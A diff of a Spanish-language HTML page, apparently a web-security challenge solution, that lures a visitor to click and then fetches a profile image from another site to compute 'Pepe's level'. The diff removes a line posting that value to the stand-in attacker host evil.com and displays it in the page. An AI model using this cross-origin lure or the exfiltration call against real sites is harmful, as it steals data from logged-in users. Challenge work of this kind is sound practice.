@@ -5,6 +5,7 @@
 </head>
 <body>
     <h1>Haz clic para ver una sorpresa</h1>
+    <div id="resultado"></div>
     <script>
         // Solicitud a /profile-pic para obtener la imagen de Pepe
         fetch('https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic', {
@@ -19,14 +20,16 @@
                 const width = img.width;
                 const height = img.height;
                 const level = width * height;
-                // Enviar el nivel a nuestro servidor
-                fetch('https://evil.com/save-level', {
-                    method: 'POST',
-                    body: JSON.stringify({ level: level })
-                });
-                // O calcular el MD5 en el cliente (usando una librería como md5.js)
-                console.log('Nivel de Pepe:', level);
+                // Mostrar las dimensiones y el nivel en el HTML
+                document.getElementById('resultado').innerHTML = `
+                    <p>Ancho: ${width}px</p>
+                    <p>Alto: ${height}px</p>
+                    <p>Nivel de Pepe: ${level}</p>
+                `;
             };
+        })
+        .catch(error => {
+            document.getElementById('resultado').innerHTML = `<p>Error: ${error.message}</p>`;
         });
     </script>
 </body>
